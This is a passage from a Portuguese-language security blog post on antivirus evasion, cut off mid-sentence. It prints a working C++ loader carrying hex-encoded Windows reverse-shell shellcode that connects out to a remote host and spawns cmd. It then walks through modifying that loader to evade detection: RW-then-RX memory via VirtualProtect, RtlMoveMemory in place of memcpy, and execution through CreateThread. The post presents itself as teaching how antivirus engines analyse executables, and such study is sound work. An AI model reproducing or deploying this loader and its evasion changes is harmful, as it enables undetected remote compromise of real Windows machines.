<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Evasão de Antivírus - Princípios Gerais e Abordagens Específicas" /><meta name="author" content="H41stur" /><meta property="og:locale" content="en" /><meta name="description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><meta property="og:description" content="“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”" /><link rel="canonical" href="https://h41stur.github.io/posts/evasao-av/" /><meta property="og:url" content="https://h41stur.github.io/posts/evasao-av/" /><meta property="og:site_name" content="H41stur" /><meta property="og:image" content="https://h41stur.github.io/img/posts/shellcode101-2.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-07-24T01:00:00-03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://h41stur.github.io/img/posts/shellcode101-2.png" /><meta property="twitter:title" content="Evasão de Antivírus - Princípios Gerais e Abordagens Específicas" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@H41stur" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H41stur"},"dateModified":"2024-08-06T10:30:28-03:00","datePublished":"2024-07-24T01:00:00-03:00","description":"“Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.”","headline":"Evasão de Antivírus - Princípios Gerais e Abordagens Específicas","image":"https://h41stur.github.io/img/posts/shellcode101-2.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://h41stur.github.io/posts/evasao-av/"},"url":"https://h41stur.github.io/posts/evasao-av/"}</script><title>Evasão de Antivírus - Princípios Gerais e Abordagens Específicas | H41stur</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="H41stur"><meta name="application-name" content="H41stur"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://h41stur.github.io/img/h41stur.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">H41stur</a></div><div class="site-subtitle font-italic">Strange is the night where black stars rise, and strange moons circle through the skies, but stranger still is lost Carcosa.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARQUIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/h41stur" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['leonardor.toledo','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/leo-toledo/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> H41stur </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jul 24, 2024, 1:00 AM -0300" >Jul 24, 2024<i class="unloaded">2024-07-24T01:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Aug 6, 2024, 10:30 AM -0300" >Aug 6, 2024<i class="unloaded">2024-08-06T10:30:28-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9691 words">53 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/img/posts/shellcode101-2.png" alt="Evasão de Antivírus - Princípios Gerais e Abordagens Específicas" /></p><h1 id="tldr">TL;DR</h1><p>Este artigo explora diversas técnicas de evasão de antivírus (AV), oferecendo uma visão geral e exemplos práticos. Abordamos métodos como ofuscação de chamadas de função, criptografia de <em>payloads</em> e manipulação de APIs, que podem reduzir significativamente a detecção por motores de AV. Demonstramos como essas técnicas podem ser implementadas. Embora não sejam soluções infalíveis, essas abordagens são essenciais para entender as estratégias de análise de executáveis pelos AVs e aprimorar a segurança. A leitura completa fornece um detalhamento técnico e teórico, além de boas práticas e considerações sobre as tendências emergentes no campo.</p><h1 id="introdução">Introdução</h1><p>Em meu <a href="https://h41stur.com/posts/shellcoding101/#shellcode-com-endere%C3%A7os-din%C3%A2micos">último artigo</a>, abordei sobre os princípios de desenvolvimento de <em>shellcodes</em>. Durante o processo, acabei me aprofundando bastante em <em>shellcodes</em> voltados para o Windows SO, o que me despertou várias ideias para novos artigos.</p><p>Decidi, então, focar um tempo para explorar técnicas voltadas para explorações comuns destes ambientes, uma vez que o conteúdo desse tipo é bastante escasso em nosso idioma.</p><p>A ideia é de que um artigo só seja publicado, caso o seu conteúdo base já esteja em artigo(s) anterior(es). Com o passar do tempo, teremos um <em>roadmap</em> inteiro sobre diversos assuntos que se interligam.</p><p>Este artigo apresenta algumas técnicas gerais das quais os antivírus utilizam para identificar um executável como ameaça ou não, assim como técnicas para dificultar esta identificação.</p><p>Lembrando que cada AV possui técnicas e complexidades diferentes de análise e não existe uma bala de prata que sirva para tornar algo 100% indetectável, porém, este conteúdo serve como esclarecimento para ações que podem ser tomadas para desenvolver um <em>exploit</em> mais eficaz.</p><p>Esse processo de documentação, por mais que seja trabalhos, é muito prazeroso, pois nada mais é do que eu fazendo o que gosto e ainda compartilhando meu centavo com a comunidade.</p><p>Portanto, este artigo fará ligação direta com o <a href="https://h41stur.com/posts/shellcoding101/#shellcode-com-endere%C3%A7os-din%C3%A2micos">Shellcoding 101</a> (diria extremamente dependente), recomendo fortemente lê-lo antes de dar o próximo passo aqui.</p><p>Boa leitura e boa sorte!</p><h1 id="desconstruindo-para-reconstruir">Desconstruindo para reconstruir</h1><p>Durante o desenvolvimento dos <em>shellcodes</em> vários outros recursos foram gerados, como scripts em Go para trabalharmos com hexadecimais, scripts ASM contendo o <em>shellcode</em> em Assembly, programas em C e C++ para testarmos a injeção dos <em>shellcodes</em>.</p><p>O programa em C++ feito para testar os <em>shellcodes</em> no Windows SO, chama a atenção por um detalhe adjacente. Ele foi feito para simular um programa vulnerável que nos permite a injeção de uma <em>string</em> de <em>bytes</em>, porém, ele pode ser visto de outras formas.</p><p>Uma vez que temos um programa que consegue injetar esta <em>string</em> de <em>bytes</em> na memória e executá-lo, então este programa também pode ser utilizado com fins maliciosos, ou seja, ele pode ser um agente, um <em>stager</em>, um <em>dropper</em> e até mesmo um <em>malware</em> no sentido geral.</p><p>Abaixo o código-fonte do último exemplo utilizado no artigo que gera um <em>reverse shell</em> invocando APIs do Windows:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\x31\xc0\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x40\x14\x8b\x00\x8b\x00\x8b\x58\x10\x31\xd2\x68\x73\x73\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x4a\x20\x01\xd9\x89\x4d\xfc\x8b\x52\x1c\x01\xda\x31\xc0\x31\xc9\x89\xe6\x8b\x7d\xfc\x8b\x3c\x87\x01\xdf\x66\x83\xc1\x07\xf3\x66\xa7\x74\x03\x40\xe2\xe8\x83\xc0\x02\x8b\x3c\x82\x01\xdf\x89\xfd\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd5\x68\x33\x32\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x77\x73\x32\x5f\x54\xff\xd0\x89\xc6\x68\x75\x70\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x66\xba\x90\x01\x29\xd4\x54\x52\xff\xd0\x68\x74\x41\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x56\xff\xd5\x31\xd2\x52\x52\x52\xb2\x06\x52\x80\xea\x05\x52\x42\x52\xff\xd0\x50\x5f\x68\x65\x63\x74\x4e\x66\x83\x6c\x24\x03\x4e\x68\x63\x6f\x6e\x6e\x54\x56\xff\xd5\xba\xc1\xa9\x48\x81\x81\xea\x01\x01\x01\x01\x52\x66\x68\x20\xfb\x31\xd2\xb2\x02\x66\x52\x89\xe2\x6a\x10\x52\x57\xff\xd0\x68\x73\x41\x4e\x4e\x66\x81\x6c\x24\x02\x4e\x4e\x68\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x53\xff\xd5\x89\xde\x68\x63\x6d\x64\x4e\x66\x83\x6c\x24\x03\x4e\x89\xe3\x57\x57\x57\x31\xff\x6a\x12\x59\x57\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\xc6\x44\x24\x10\x44\x8d\x4c\x24\x10\x54\x51\x57\x57\x57\x47\x57\x4f\x57\x57\x53\x57\xff\xd0\x68\x65\x73\x73\x4e\x66\x83\x6c\x24\x03\x4e\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x56\xff\xd5\x31\xc9\x51\xff\xd0</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">exec_mem</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Falha na alocação de memória.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>

    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec_mem</span><span class="p">;</span>
    <span class="n">func</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Uma vez que este programa foi a forma mais simples de injetar e executar um <em>shellcode</em> em um espaço de memória, ele não foi pensado para lidar com nenhum tipo de bloqueio proveniente de um antivírus.</p><p>Ao analisarmos no <strong>VirusTotal</strong>, podemos ver que foi identificado como ameaça por <strong>28</strong> antivírus:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723212418.png" alt="" /></p><ul><li><a href="https://www.virustotal.com/gui/file/60367827bdd3a28562341f6ce9faf7972a72e266bc5c331b6804fc2fbb2d61da?nocache=1">https://www.virustotal.com/gui/file/60367827bdd3a28562341f6ce9faf7972a72e266bc5c331b6804fc2fbb2d61da?nocache=1</a></ul><h2 id="alterando-os-mecanismos">Alterando os mecanismos</h2><p>Conforme entendemos sobre algumas das técnicas de análise dos antivírus, vamos desconstruir este programa e analisá-lo linha-a-linha, em cada oportunidade aplicarmos uma melhoria.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723213710.png" alt="" /></p><ul><li>As linhas de 1 a 3 importam as bibliotecas necessárias para a execução do programa;<li>A linha 5 contém o <em>shellcode</em> a ser injetado;<li>As linhas de 7 a 23 contém a função <em>main</em>;</ul><p>A linha 8 cria uma variável que armazena o tamanho do <em>shellcode</em>. A princípio, retiraremos sua declaração de dentro da <code class="language-plaintext highlighter-rouge">main</code> para torná-la uma variável global e alteraremos seu formato de <code class="language-plaintext highlighter-rouge">size_t</code> para <code class="language-plaintext highlighter-rouge">unsigned int</code>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
</pre></table></code></div></div><p>Esta alteração ocorre, pois <code class="language-plaintext highlighter-rouge">size_t</code> é comumente utilizado para representar tamanhos e contagens de objetos. Ele é o tipo retornado por <code class="language-plaintext highlighter-rouge">sizeof</code> sendo usado para expressar tamanhos de objetos em <em>bytes</em>.</p><blockquote><p>Não que isso fará de fato diferença, ou que o <code class="language-plaintext highlighter-rouge">size_t</code> não deva ser utilizado no código (inclusive utilizaremos), mas é que neste trecho em específico, ele está sendo usado justamente no <em>shellcode</em> e qualquer implementação que possa causar menos suspeita pode ajudar.</p></blockquote><p>Enquanto <code class="language-plaintext highlighter-rouge">unsigned int</code> é um inteiro genérico, em outras palavras, <code class="language-plaintext highlighter-rouge">size_t</code> dentro do nosso programa causa muito mais suspeitas por expressar tamanhos de objetos em <em>bytes</em>.</p><p>Outra observação importante, é sobre as permissões.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240723213918.png" alt="" /></p><p>A linha 10 aloca um <em>buffer</em> de memória do tamanho do <em>shellcode</em> e o marca com permissão de execução, leitura e escrita (<code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code>), este comportamento é <strong>considerado malicioso</strong> pela maioria dos mecanismos de antivírus, uma vez que é extremamente raro em um canário real, uma região de memória possuir estas permissões ao mesmo tempo.</p><p>Para diminuirmos as suspeitas, podemos separar esta ação em <strong>duas</strong> partes:</p><ol><li>Alocamos um <em>buffer</em> de memória somente com permissões de leitura e escrita (<code class="language-plaintext highlighter-rouge">PAGE_READWRITE</code>);<li>Copiamos o <em>shellcode</em> para este <em>buffer</em>;<li>Alteramos as permissões deste <em>buffer</em> para execução e leitura;</ol><p>Desta forma, nunca teremos um espaço na memória com todas as permissões. Sendo assim, no código original, alteraremos o trecho:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</pre></table></code></div></div><p>Para:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="n">exec_mem</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
</pre></table></code></div></div><p>Removeremos as linhas de 12 a 15 que contém um <code class="language-plaintext highlighter-rouge">if</code> desnecessário para nosso objetivo atual.</p><p>Copiaremos nosso <em>shellcode</em> para o <em>buffer</em>. Repare que esta ação já existe na linha 17:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">memcpy</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
</pre></table></code></div></div><p>Porém, esta linha contém outro problema: a função <code class="language-plaintext highlighter-rouge">memcpy()</code> é considerada vulnerável. Analisando seu formato original:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="nf">memcpy</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">);</span>
</pre></table></code></div></div><p>Sabemos que a <code class="language-plaintext highlighter-rouge">memcpy</code> não lida bem com sobreposição de memória. Se as regiões de origem e destino se sobrepõem, o comportamento é indefinido. Isso significa que se <code class="language-plaintext highlighter-rouge">src</code> e <code class="language-plaintext highlighter-rouge">dest</code> apontarem para regiões de memória que se sobrepõem, <code class="language-plaintext highlighter-rouge">memcpy</code> pode causar corrupção de dados.</p><p>Portanto, seu uso já pode alertar mecanismos de antivírus sobre a insegurança do programa.</p><p>Ao invés de utilizá-la, podemos usar a função <code class="language-plaintext highlighter-rouge">RtlMoveMemory</code> que faz parte das <strong>APIs do Windows</strong> (<a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">MSDN</a>), esta função lida corretamente com sobreposição de memória. Isso significa que mesmo se as regiões de origem e destino se sobrepõem, a função garantirá que os dados sejam copiados corretamente sem corrupção.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">VOID</span> <span class="nf">RtlMoveMemory</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">Destination</span><span class="p">,</span> <span class="k">const</span> <span class="n">VOID</span><span class="o">*</span> <span class="n">Source</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>
</pre></table></code></div></div><p>Substituindo no código-fonte, temos:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
</pre></table></code></div></div><p>Uma vez com o <em>shellcode</em> copiado para o <em>buffer</em>, podemos utilizar a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect</a> das APIs do Windows, para alterar as permissões deste <em>buffer</em>. Esta função retorna um valor <em>booleano</em> de acordo com seu sucesso e tem o seguinte formato:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>  <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span> <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Note que seu último argumento é <code class="language-plaintext highlighter-rouge">lpflOldProtect</code>, sendo um ponteiro para uma variável que receberá o valor das permissões de proteção anteriores da região de memória. <code class="language-plaintext highlighter-rouge">oldprotect</code> será usado para armazenar as permissões originais, permitindo que elas sejam restauradas mais tarde, se necessário.</p><p>Portanto, precisaremos criar uma variável com uma <code class="language-plaintext highlighter-rouge">DWORD</code> nula para apontar nesta função:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">DWORD</span> <span class="n">oldProtect</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</pre></table></code></div></div><p>Neste caso:</p><ul><li><strong>DWORD</strong>, pois é o formato do argumento;<li><strong>0</strong> = <strong>NULL</strong>, pois não nos interessa voltar as permissões anteriores.</ul><p>Montando a função no código, temos a seguinte linha:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">rx</span> <span class="o">=</span> <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
</pre></table></code></div></div><p>Por fim, as linhas 19 e 20 do código original, são responsáveis pela execução do <em>buffer</em>. Como a função <code class="language-plaintext highlighter-rouge">VirtualProtect</code> retorna um <em>booleano</em>, criaremos uma condição onde caso a resposta difira de zero, vamos executar este <em>bufffer</em>, porém em uma nova <em>thread</em>.</p><p>Para isso, utilizaremos a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread</a> as APIs do Windows. Esta função cria um <em>thread</em> para ser executado no espaço de endereço virtual do processo de chamada.</p><p><code class="language-plaintext highlighter-rouge">CreateThread</code> retorna um manipulador (<code class="language-plaintext highlighter-rouge">HANDLE</code>) para a nova <em>thread</em> se a criação for bem-sucedida. Se a criação falhar, retorna <code class="language-plaintext highlighter-rouge">NULL</code>. Sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="n">HANDLE</span> <span class="nf">CreateThread</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span>  <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>            <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Montando esta função, temos a seguinte linha:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kr">thread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span> <span class="n">exec_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><strong><code class="language-plaintext highlighter-rouge">lpThreadAttributes</code> (0)</strong>: Um ponteiro para uma estrutura <code class="language-plaintext highlighter-rouge">SECURITY_ATTRIBUTES</code> que define a segurança da thread. Passar <code class="language-plaintext highlighter-rouge">0</code> (ou <code class="language-plaintext highlighter-rouge">NULL</code>) usa as configurações de segurança padrão, herdando do processo pai.<li><strong><code class="language-plaintext highlighter-rouge">dwStackSize</code> (0)</strong>: Define o tamanho da pilha da thread em bytes. Passar <code class="language-plaintext highlighter-rouge">0</code> usa o tamanho padrão da pilha.<li><strong><code class="language-plaintext highlighter-rouge">lpStartAddress</code> (<code class="language-plaintext highlighter-rouge">(LPTHREAD_START_ROUTINE) exec_mem</code>)</strong>: Um ponteiro para a função que será executada pela nova thread. Aqui, <code class="language-plaintext highlighter-rouge">exec_mem</code> é convertido para o tipo <code class="language-plaintext highlighter-rouge">LPTHREAD_START_ROUTINE</code>, que é um ponteiro para uma função que retorna 